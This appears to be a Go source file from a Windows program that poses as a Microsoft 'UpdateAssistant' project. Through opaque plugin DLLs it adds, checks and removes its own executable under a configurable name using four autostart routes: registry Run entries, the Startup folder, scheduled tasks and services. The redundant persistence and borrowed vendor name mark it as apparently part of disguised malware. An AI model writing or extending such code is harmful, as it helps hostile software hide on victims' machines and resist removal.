//go:build windows

package sysutil

import (
	"os"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

func startupName() string { return config.DisplayName() + ".exe" }

func startupDLL(fn func(*loader.Plugin)) {
	p, err := loader.Load("startup")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func persistDLL(fn func(*loader.Plugin)) {
	p, err := loader.Load("persistence")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func persistCall(export string, args ...uintptr) dllResult {
	var r dllResult
	persistDLL(func(p *loader.Plugin) {
		buf := make([]byte, 256)
		all := make([]uintptr, len(args)+2)
		copy(all, args)
		all[len(args)] = uintptr(unsafe.Pointer(&buf[0]))
		all[len(args)+1] = uintptr(256)
		n, err := p.Call(export, all...)
		if err == nil && int(n) > 0 {
			r = parseDLLResult(string(buf[:int(n)]))
		}
	})
	return r
}

func startupCall(export string, args ...uintptr) dllResult {
	var r dllResult
	startupDLL(func(p *loader.Plugin) {
		buf := make([]byte, 256)
		all := make([]uintptr, len(args)+2)
		copy(all, args)
		all[len(args)] = uintptr(unsafe.Pointer(&buf[0]))
		all[len(args)+1] = uintptr(256)
		n, err := p.Call(export, all...)
		if err == nil && int(n) > 0 {
			r = parseDLLResult(string(buf[:int(n)]))
		}
	})
	return r
}

func StartupAdd() bool {
	exe, err := os.Executable()
	if err != nil {
		logger.Error("startup add: could not get exe path: %v", err)
		return false
	}
	name := startupName()
	r := startupCall("startup_add",
		uintptr(unsafe.Pointer(loader.BytePtr(exe))),
		uintptr(unsafe.Pointer(loader.BytePtr(name))),
	)
	if !r.OK {
		logger.Error("startup add failed: %s", r.Detail)
	}
	return r.OK
}

func StartupRemove() bool {
	r := startupCall("startup_remove",
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	if !r.OK {
		logger.Error("startup remove failed: %s", r.Detail)
	}
	return r.OK
}

func RegEnabled() bool {
	var result bool
	persistDLL(func(p *loader.Plugin) {
		r, _ := p.Call("reg_enabled", uintptr(unsafe.Pointer(loader.BytePtr(startupName()))))
		result = int(r) == 1
	})
	return result
}

func FolderEnabled() bool {
	var result bool
	persistDLL(func(p *loader.Plugin) {
		r, _ := p.Call("folder_enabled", uintptr(unsafe.Pointer(loader.BytePtr(startupName()))))
		result = int(r) == 1
	})
	return result
}

func FolderAdd() bool {
	exe, err := os.Executable()
	if err != nil {
		return false
	}
	r := persistCall("folder_add",
		uintptr(unsafe.Pointer(loader.BytePtr(exe))),
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	return r.OK
}

func FolderRemove() bool {
	r := persistCall("folder_remove",
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	return r.OK
}

func TaskEnabled() bool {
	var result bool
	persistDLL(func(p *loader.Plugin) {
		r, _ := p.Call("task_enabled", uintptr(unsafe.Pointer(loader.BytePtr(startupName()))))
		result = int(r) == 1
	})
	return result
}

func TaskAdd() bool {
	exe, err := os.Executable()
	if err != nil {
		return false
	}
	r := persistCall("task_add",
		uintptr(unsafe.Pointer(loader.BytePtr(exe))),
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	return r.OK
}

func TaskRemove() bool {
	r := persistCall("task_remove",
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	return r.OK
}

func ServiceEnabled() bool {
	var result bool
	persistDLL(func(p *loader.Plugin) {
		r, _ := p.Call("service_enabled", uintptr(unsafe.Pointer(loader.BytePtr(startupName()))))
		result = int(r) == 1
	})
	return result
}

func ServiceAdd() bool {
	exe, err := os.Executable()
	if err != nil {
		return false
	}
	r := persistCall("service_add",
		uintptr(unsafe.Pointer(loader.BytePtr(exe))),
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	return r.OK
}

func ServiceRemove() bool {
	r := persistCall("service_remove",
		uintptr(unsafe.Pointer(loader.BytePtr(startupName()))),
	)
	return r.OK
}
